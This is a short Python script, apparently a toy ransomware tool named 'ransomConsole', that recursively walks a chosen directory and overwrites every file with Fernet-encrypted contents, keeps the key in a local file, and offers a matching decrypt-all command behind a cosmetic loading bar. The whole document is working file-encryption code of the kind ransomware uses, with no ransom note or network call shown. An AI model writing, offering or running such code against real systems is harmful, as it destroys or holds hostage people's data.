#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
from rich.progress import track
import time
for i in track(range(100),description='Loading program...'):time.sleep(.03)
VER='0.0.1-Pro'
KEY_PATH='secret.key'
EXCLUDED=['console.py','console',KEY_PATH,'ransomConsole-0.0.1-Pro.tar.gz','Makefile']
if not os.path.exists(KEY_PATH):
	key=Fernet.generate_key()
	with open(KEY_PATH,'wb')as f:f.write(key)
else:
	with open(KEY_PATH,'rb')as f:key=f.read()
def encrypt(filepath):
	A=filepath
	if os.path.basename(A)in EXCLUDED:return
	if os.path.isfile(A):
		with open(A,'rb')as B:C=B.read()
		with open(A,'wb')as B:B.write(Fernet(key).encrypt(C))
	print(f"Encrypted {A}")
def encryptAll(rootDir):
	for(A,E,B)in os.walk(rootDir):
		for C in B:D=os.path.join(A,C);encrypt(D)
def decrypt(filepath):
	A=filepath
	if os.path.basename(A)in EXCLUDED:return
	if os.path.isfile(A):
		with open(A,'rb')as B:C=B.read()
		with open(A,'wb')as B:B.write(Fernet(key).decrypt(C))
	print(f"Decrypted {A}")
def decryptAll(rootDir):
	for(A,E,B)in os.walk(rootDir):
		for C in B:D=os.path.join(A,C);decrypt(D)
def main():
	A=input('Enter your root directory: ')or'.';B=input('Enter your command: ')
	if B=='encrypt all':encryptAll(A)
	elif B=='decrypt all':decryptAll(A)
	else:print('Command not found.\nUse "encrypt all", or "decrypt all"')
if __name__=='__main__':main()